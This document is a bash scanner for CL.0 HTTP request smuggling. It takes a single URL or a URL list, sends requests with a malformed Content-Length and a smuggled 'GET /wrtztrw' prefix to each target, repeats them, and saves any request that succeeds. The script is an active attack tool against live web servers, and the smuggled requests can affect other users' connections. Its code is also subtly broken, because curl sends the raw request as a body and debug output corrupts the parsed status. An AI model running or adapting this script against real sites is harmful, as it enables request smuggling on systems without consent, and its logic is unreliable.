#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to display usage
usage() {
    echo "Usage: $0 -u <URL> [-o <output_file>] [-k]"
    echo "  -u <URL>        Single URL to scan"
    echo "  -l <file>       File containing list of URLs"
    echo "  -o <output_file> Output file for vulnerable requests"
    echo "  -k              Disable SSL verification (insecure)"
    exit 1
}

# Parse command-line arguments
while getopts "u:l:o:k" opt; do
    case $opt in
        u) URL="$OPTARG" ;;
        l) URL_LIST="$OPTARG" ;;
        o) OUTPUT_FILE="$OPTARG" ;;
        k) INSECURE="--insecure" ;;
        *) usage ;;
    esac
done

# Ensure either -u or -l is provided
if [ -z "$URL" ] && [ -z "$URL_LIST" ]; then
    usage
fi

# Function to send malformed request and check response
send_malformed_request() {
    local url="$1"
    local gadget="$2"
    local method="$3"
    local insecure="$4"
    local req_id="$5"  # Unique ID for temporary files
    local host=$(echo "$url" | awk -F/ '{print $3}')
    local path=$(echo "$url" | sed 's|https\?://[^/]*||' || echo "/")

    # Set Content-Length header based on gadget
    if [ "$gadget" = "nameprefix1" ]; then
        content_length=" Content-Length: 48"
    elif [ "$gadget" = "nameprefix2" ]; then
        content_length="  Content-Length: 48"
    else
        content_length=" Content-Length: 48"
    fi

    # Base payload (48 bytes, including trailing \r\n)
    payload="GET /wrtztrw?wrtztrw=wrtztrw HTTP/1.1\r\nX-YzBqv: "

    # Construct raw request
    raw_request="${method} ${path} HTTP/1.1\r\nHost: ${host}\r\nCache-Control: max-age=0\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nVia: null\r\nContent-Type: application/x-www-form-urlencoded\r\nFoo: bar\r\n${content_length}\r\n\r\n${payload}"

    # Save request to unique temporary file
    tmp_request="/tmp/smuggling_request_${req_id}.txt"
    tmp_headers="/tmp/headers_${req_id}.txt"
    tmp_error="/tmp/error_${req_id}.txt"
    echo -ne "$raw_request" > "$tmp_request"

    # Send request with curl and capture headers
    curl $insecure -s -D "$tmp_headers" --connect-timeout 10 -X "$method" --data-binary @"$tmp_request" "$url" >/dev/null 2>"$tmp_error"
    if [ $? -ne 0 ] || [ -s "$tmp_error" ]; then
        error=$(cat "$tmp_error" 2>/dev/null || echo "Unknown error")
        echo -e "${YELLOW}Error for ${gadget} (${method}) on ${url} (Request $req_id): ${error}${NC}"
        rm -f "$tmp_request" "$tmp_headers" "$tmp_error"
        return 1
    fi

    # Extract status code and Location header
    status_code=$(head -n 1 "$tmp_headers" 2>/dev/null | grep -o '[0-9]\{3\}' || echo "No Response")
    location=$(grep -i '^Location:' "$tmp_headers" 2>/dev/null | cut -d' ' -f2- | tr -d '\r' || echo "")

    # Debug: Save headers for inspection
    cp "$tmp_headers" "/tmp/headers_${req_id}_debug.txt" 2>/dev/null

    # Debug: Print status and Location header
    echo -e "${YELLOW}Request $req_id - Status: ${status_code}, Location Header: ${location}${NC}"

    # Clean up
    rm -f "$tmp_request" "$tmp_headers" "$tmp_error"

    # Return status and location
    echo "$status_code|$location"
}

# Function to check vulnerability
check_vulnerability() {
    local url="$1"
    local gadget="$2"
    local method="$3"
    local output_file="$4"
    local insecure="$5"
    local status
    local location
    local vulnerable=false

    # Send first request
    echo -e "${YELLOW}Sending initial request for ${gadget} (${method}) on ${url}${NC}"
    IFS='|' read -r status location <<< "$(send_malformed_request "$url" "$gadget" "$method" "$insecure" "initial")"
    if [ $? -ne 0 ]; then
        status="No Response"
    else
        status=$(echo "$status" | grep -o '[0-9]\{3\}' || echo "No Response")
    fi

    # Check if status is valid
    if [[ "$status" =~ ^[0-9]+$ && " 200 301 302 307 404 401 405 " =~ " $status " ]]; then
        echo -e "${YELLOW}Valid status ($status) received, sending 10 additional requests${NC}"
        # Send same request 10 times sequentially
        for ((i=1; i<=10; i++)); do
            echo -e "${YELLOW}Sending request $i for ${gadget} (${method})${NC}"
            IFS='|' read -r repeat_status repeat_location <<< "$(send_malformed_request "$url" "$gadget" "$method" "$insecure" "$i")"
            if [ $? -eq 0 ] && [ -n "$repeat_location" ] && [[ "$repeat_location" == *"wrtztrw?wrtztrw=wrtztrw"* ]]; then
                vulnerable=true
                # Save vulnerable request
                filename="cl-0-${gadget}-${method,,}.txt"
                content_length=" Content-Length: 48"
                if [ "$gadget" = "nameprefix2" ]; then
                    content_length="  Content-Length: 48"
                fi
                raw_request="${method} / HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nCache-Control: max-age=0\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nVia: null\r\nContent-Type: application/x-www-form-urlencoded\r\nFoo: bar\r\n${content_length}\r\n\r\nGET /wrtztrw?wrtztrw=wrtztrw HTTP/1.1\r\nX-YzBqv: "
                echo -ne "$raw_request" > "$filename"
                if [ -n "$output_file" ]; then
                    echo "Vulnerable request saved to $filename" >> "$output_file"
                fi
                break
            fi
        done
    else
        echo -e "${YELLOW}Initial request status ($status) not valid, skipping additional requests${NC}"
    fi

    # Print result
    color="$GREEN"
    if [ "$vulnerable" = "true" ]; then
        color="$RED"
    fi
    echo -e "${color}Gadget: ${gadget}, Method: ${method}, Status: ${status:-No Response}, Vulnerable: ${vulnerable}${NC}"
}

# Function to scan a single URL
scan_url() {
    local url="$1"
    local output_file="$2"
    local insecure="$3"
    echo "Scanning ${url}..."

    # Define gadgets and methods
    gadgets=(
        "nameprefix1|POST"  # Prioritize POST for nameprefix1, as in Burp
        "nameprefix1|GET"
        "nameprefix2|POST"
        "nameprefix2|GET"
    )

    for gadget_method in "${gadgets[@]}"; do
        IFS='|' read -r gadget method <<< "$gadget_method"
        check_vulnerability "$url" "$gadget" "$method" "$output_file" "$insecure"
    done
}

# Main logic
if [ -n "$URL" ]; then
    scan_url "$URL" "$OUTPUT_FILE" "$INSECURE"
elif [ -n "$URL_LIST" ]; then
    if [ ! -f "$URL_LIST" ]; then
        echo "Error: File $URL_LIST not found"
        exit 1
    fi
    while IFS= read -r url; do
        if [ -n "$url" ]; then
            scan_url "$url" "$OUTPUT_FILE" "$INSECURE"
        fi
    done < "$URL_LIST"
fi
